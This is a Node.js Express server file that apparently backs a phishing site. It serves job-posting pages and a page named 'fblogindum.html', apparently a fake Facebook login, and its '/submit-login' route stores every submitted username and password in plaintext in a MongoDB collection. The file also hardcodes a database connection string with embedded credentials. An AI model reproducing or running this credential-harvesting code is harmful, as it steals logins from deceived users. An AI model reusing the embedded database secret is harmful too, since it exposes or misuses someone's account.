const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

const uri = "mongodb+srv://garycantilang:<0xMkSE6i57Nm5hUd>@cluster0.cygdj.mongodb.net/logdata?retryWrites=true&w=majority&appName=Cluster0";
const client = new MongoClient(uri);

let db; // Declare the db variable

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('logdata'); // Your actual database name
        console.log("Connected to MongoDB");
    } catch (error) {
        console.error("MongoDB connection error:", error.message || error);
    }
}

connectToDatabase();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).send('Database connection not initialized.');
        }
        
        const loginData = { username, password, timestamp: new Date() };
        console.log("Attempting to insert data:", loginData);
        
        const result = await db.collection('ifsh').insertOne(loginData);
        console.log("Data inserted successfully:", result);
        
        res.send('Login information saved successfully to MongoDB.');
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Error saving data to MongoDB.');
    }
});

// Routes to serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html'));
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html'));
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html'));
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
